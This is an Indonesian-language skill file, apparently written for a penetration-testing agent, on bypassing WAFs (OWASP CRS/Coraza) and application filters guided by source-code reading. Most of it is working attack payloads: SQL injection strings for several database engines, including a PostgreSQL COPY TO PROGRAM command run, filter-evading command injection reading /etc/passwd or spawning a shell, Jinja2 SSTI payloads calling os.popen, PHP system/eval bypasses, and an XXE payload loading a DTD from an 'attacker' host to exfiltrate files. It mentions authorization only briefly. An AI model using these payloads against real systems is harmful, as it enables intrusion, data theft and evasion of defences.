---
name: "WAF & Filter Bypass — Payload White-Box"
description: "Konstruksi payload yang lolos WAF (OWASP CRS/Coraza) dan filter aplikasi namun tetap dieksekusi sink: SQLi per mesin, command injection, SSTI, eval/fungsi berbahaya PHP, XXE, deserialization, dan manipulasi transport — dipandu pembacaan kode, bukan fuzzing buta."
tags: [waf-bypass, filter-evasion, crs, coraza, modsecurity, sqli, command-injection, ssti, xxe, payload-encoding]
---

# WAF & Filter Bypass — Payload White-Box

Ada dua lapisan yang harus dilewati, dan keduanya bekerja dengan aturan berbeda:

1. **WAF** — inspektur generik yang mencocokkan pola (CRS regex, libinjection, anomaly score).
2. **Filter aplikasi** — kode yang Anda baca: blacklist, `preg_match`, `str_replace`, validasi tipe.

Payload yang bisa dipertanggungjawabkan menyentuh keduanya sekaligus: **tidak cocok** dengan aturan WAF, **lolos** validasi aplikasi, dan **tiba di sink dengan makna utuh**. Fuzzing buta hanya memberi tebakan; source memberi tahu kanal mana yang diperiksa WAF dan mana yang tidak.

> Batas dengan skill lain: metodologi evasion black-box (fingerprint, direct-to-origin, smuggling) ada di [waf-evasion-methodology](../../waf-evasion-methodology/SKILL.md). Berkas ini fokus pada payload yang lahir dari pembacaan kode.

## 1. Urutan kerja

1. **Petakan lapisan.** Reverse proxy/WAF → framework filter → sanitasi lokal → sink.
2. **Baca konfigurasi.** Versi CRS/Coraza, paranoia level, body processor (JSON/XML/multipart), custom rule, batas ukuran body.
3. **Cari mismatch.** Parameter yang diinspeksi WAF vs yang dibaca aplikasi; encoding yang dinormalisasi WAF vs backend; urutan konkatenasi di kode.
4. **Uji diferensial.** Baseline normal, kontrol positif yang pasti diblokir, lalu kandidat. Tanpa baseline, "bypass" hanya berarti payload tidak valid.
5. **Baru tulis payload final.** Simpan WAF, paranoia level, dan waktu di catatan bukti.

| Lapisan | Yang diperiksa | Titik bypass |
|---|---|---|
| WAF | URL, body sesuai `Content-Type`, header tertentu | kanal lain (cookie, WebSocket, path segment, multipart filename), fragmentasi parameter |
| Framework filter | nilai parameter setelah decode | encoding yang tidak dinormalisasi filter, tipe data (array/objek), urutan decode |
| Sink | string final hasil konkatenasi | perakitan di server, bukan di request |

## 2. SQLi — primitif per mesin

| Primitif | MySQL/MariaDB | PostgreSQL | MSSQL |
|---|---|---|---|
| Pisah keyword | `UN/**/ION`, `/*!50000UNION*/` | `UN/**/ION` | `UN/**/ION` |
| Spasi alternatif | `%09 %0a %0c %0d`, `()`, `/*!*/` | sama | sama |
| Operator | `OR`→`\|\|`/`&&`, `=`→`LIKE`/`BETWEEN`/`IN` | `OR`/`AND`, `ILIKE` | `OR`→`\|\|` (jika `ANSI_NULLS`), `LIKE` |
| Literal tanpa kutip | `0x61646d696e`, `CHAR(97,100)` | `CHR(97)\|\|CHR(100)`, `$$admin$$`, `E'\x61'` | `CHAR(97)+CHAR(100)` |
| Delay | `SLEEP(5)`, `BENCHMARK(5000000,MD5(1))` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` |
| Terminator | `-- -`, `#%0a`, `/**/` | `--`, `/**/` | `--`, `/**/` |

Contoh yang sering dipakai:

```sql
-- MySQL: versioned comment membuat keyword tidak terlihat sebagai keyword
'/*!50000UNION*//*!50000SELECT*/1,2,3-- -

-- MySQL: boolean tanpa operator yang lazim diblokir
' OR 1 LIKE 1-- -

-- MySQL: blind time-based
1' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -

-- PostgreSQL: stacked query + dollar-quote agar tidak perlu escape kutip
1;SELECT pg_sleep(5)-- -
1;COPY (SELECT $$id$$) TO PROGRAM $$bash -c 'id > /tmp/p'$$;-- -

-- MSSQL: tanpa kutip ganda di payload
1;WAITFOR DELAY '0:0:5'-- -
```

**Catatan CRS/Coraza yang penting.** Aturan SQLi utama (famili `942xxx`) memakai **libinjection**, yang menormalkan komentar, case, dan spasi sebelum mencocokkan. Artinya `UN/**/ION` sering **tetap terdeteksi** — obfuscasi sintaks bukan jalan pintas. Di paranoia level 1, ambang anomaly inbound adalah 5; bypass yang lebih dapat diandalkan:

- **Fragmentasi parameter.** Jika kode menggabungkan `a + b` sebelum query, WAF memeriksa masing-masing parameter secara terpisah. Contoh: `?a=1'/*&b=*/OR 1=1-- -` menjadi `1'/* */OR 1=1-- -` di sink. Ini hanya bisa diketahui dari source.
- **Kanal yang tidak diinspeksi.** Header, cookie, nama file multipart, path segment, atau body yang di-parse aplikasi dengan `Content-Type` berbeda dari yang diinspeksi WAF.
- **Turunkan skor, bukan samarkan sintaks.** Payload yang hanya memicu satu aturan skor rendah (mis. string literal mencurigakan) lebih baik daripada `UNION SELECT` yang memicu beberapa aturan sekaligus.

WAF yang memeriksa body JSON/XML hanya melakukannya jika body processor aktif; cek apakah aplikasi membaca `php://input`/stream mentah sementara WAF mem-parse sebagai form.

## 3. Command injection

| Filter yang menangkap | Alternatif |
|---|---|
| `;` `\|` `&&` | `%0a`, `%0d`, `$()`, backtick, `{cmd,arg}` |
| spasi | `${IFS}`, `$IFS`, tab `%09`, `<`/`>` redirection |
| nama perintah (`cat`, `whoami`) | kutip di tengah kata, wildcard, `printf` |
| `/` | `${PATH:0:1}`, `${PWD:0:1}` |
| `-` pada argumen | wildcard `?`, `*` |

```bash
127.0.0.1;cat${IFS}/etc/passwd
127.0.0.1|{cat,/etc/passwd}
127.0.0.1;c'a't /etc/pass?d
127.0.0.1;$(printf '\x63\x61\x74' /etc/passwd)
127.0.0.1 && w'h'o'am'i
127.0.0.1;${PATH:0:1}bin${PATH:0:1}sh
```

Windows: `&`, `|`, `&&`, `||`, `%COMSPEC% /c`, escape `^` untuk memecah karakter khusus, dan `powershell -enc <base64-utf16le>`. Encoding UTF-16LE untuk `-enc` wajib; base64 ASCII biasa akan gagal.

## 4. SSTI — filter evasion

Deteksi dasar tetap `{{7*7}}` (49) dan `{{7*'7'}}` (7777777 untuk Python). Jika filter memblokir substring, pindahkan string ke request:

```jinja2
{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{% set a='o' %}{% set b='s' %}{{ lipsum.__globals__[a+b].popen('id').read() }}
```

- `_` atau `os` diblokir → rakit dari `request.args`/`{% set %}`; `attr()` menggantikan akses atribut literal.
- `{{` diblokir → `{% set x=... %}` lalu cetak lewat ekspresi yang diizinkan; jika seluruh delimiter diblokir, serang engine lain di stack yang sama.
- Filter keyword case-sensitive → Jinja2 tidak case-sensitive untuk nama atribut, tetapi string pencocokan filter biasanya case-sensitive.

Payload engine lain ada di [injection-attacks.md](./injection-attacks.md#server-side-template-injection-ssti). Perhatikan bahwa payload Twig 1.x (`_self.env.registerUndefinedFilterCallback`) dan FreeMarker `?new()` sudah diblokir di versi modern — verifikasi versi sebelum memakai.

## 5. PHP — filter fungsi berbahaya dan `eval`

Filter yang memblokir nama fungsi hampir selalu bisa dilewati karena PHP mengeksekusi **string yang dirakit server-side**, sementara WAF hanya melihat request:

```php
// nama fungsi case-insensitive dan bisa dirakit
$f = 'sys'.'tem'; $f('id');
('sys'.'tem')('id');
\system('id');                  // namespace global eksplisit

// fungsi alternatif saat blacklist tidak lengkap
popen('id','r'); proc_open('id', $d, $p); passthru('id'); `id`;

// callback / eval
call_user_func('system','id');
eval(base64_decode('c3lzdGVtKCJpZCIpOw=='));
```

- Blacklist sering hanya memuat `system|exec|shell_exec|passthru`; `popen`, `proc_open`, `pcntl_exec`, backtick, `assert` (PHP < 8), dan `create_function` (PHP < 8) lolos.
- `eval` dengan filter karakter: rakit payload dari variabel request (`$_GET`, `$_POST`) agar literal berbahaya tidak muncul di request.
- `include`/`require` dengan wrapper (`php://filter`, `data://`) melewati filter ekstensi file.

Batas klaim: apakah pemanggilan benar-benar sampai ke `eval` harus dibuktikan di source (jalur input → variabel → `eval`), bukan diasumsikan dari nama parameter.

## 6. XXE

| Filter | Bypass |
|---|---|
| Regex pada body ASCII | kirim UTF-16 (`FF FE` + UTF-16LE) dengan `encoding="UTF-16"` |
| `<!ENTITY` inline diblokir | parameter entity + DTD eksternal |
| `SYSTEM` diblokir | tidak bisa di-case-kan (keyword XML case-sensitive); pindahkan ke DTD eksternal |
| DOCTYPE diblokir | `XInclude` (`<xi:include href="file:///etc/passwd"/>`) bila parser mengaktifkannya |
| respons tidak memuat data | OOB: parameter entity yang memanggil listener Anda |

```xml
<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">%dtd;]>
<root>test</root>
```

`evil.dtd` berisi definisi entity yang mengeksfiltrasi isi berkas. Untuk PHP, `php://filter/convert.base64-encode/resource=/etc/passwd` menghindari karakter yang merusak XML.

## 7. Deserialization

WAF jarang menginspeksi body biner; yang perlu dijaga adalah **jalur pengiriman** dan **encoding**:

- Java: kirim base64 dari keluaran `ysoserial`, atau body mentah dengan `Content-Type: application/x-java-serialized-object`; gzip jika ada filter panjang.
- .NET: `__VIEWSTATE` (butuh machineKey), cookie `DNNPersonalization` (butuh enkripsi 3DES — lihat [dotnet-deserialization.md](./dotnet-deserialization.md)).
- PHP: objek serialized di cookie/body; properti private memakai null byte (`%00`) — pastikan transport tidak memotongnya.
- Jangan mengandalkan base64 sebagai bypass: jika WAF mendekode base64 (banyak yang melakukannya untuk body JSON), payload tetap terlihat.

## 8. Transport dan parsing

Ringkas; detail ada di skill WAF evasion.

| Teknik | Kapan dipakai | Risiko |
|---|---|---|
| Ganti `Content-Type` (`text/plain`, `application/json` → form) | WAF memilih parser berdasarkan header, aplikasi tidak | aplikasi bisa menolak body |
| Multipart + payload di `filename` | filter memeriksa field, bukan nama file | framework mem-parse nama file berbeda |
| HPP (`?id=1&id=payload`) | WAF memilih nilai pertama, backend terakhir | backend bisa menggabungkan nilai |
| Chunked / fragmentasi body | aturan WAF bekerja per-baris | rawan merusak payload |
| WebSocket | banyak WAF tidak mem-parse frame WS | butuh klien WS di script |
| JSON `\u0027` | WAF memeriksa byte mentah, backend men-decode | hanya jika WAF tidak mem-parse JSON |

## 9. Verifikasi dan batas

| Yang diuji | Bukti yang harus diambil |
|---|---|
| Payload diblokir atau tidak | status, panjang body, halaman blokir, header WAF |
| Payload dieksekusi sink | output perintah, delay terukur, data yang hanya bisa dibaca identitas istimewa |
| Stabilitas | dua kali berturut-turut dari state bersih |

Berhenti bila respons 200 tidak disertai efek di backend — itu bukan bypass. Aksi yang mengubah state target tetap butuh otorisasi per aksi; uji di staging bila tersedia.

## 10. Best Practices

- Mulai dari source: kanal mana yang diperiksa WAF, dan bagaimana aplikasi merakit string.
- Ubah satu variabel per iterasi; catat mana yang mengubah respons.
- Pertahankan makna payload; obfuscation yang mengubah hasil bukan bypass.
- Verifikasi versi CRS/Coraza dan paranoia level sebelum menyimpulkan aturan mana yang relevan.
- Simpan payload final beserta request mentah dan konteks WAF; payload tanpa konteks tidak bisa direproduksi.
- Jangan meninggalkan artefak (file, akun, webshell) dan catat yang tidak bisa dibersihkan.
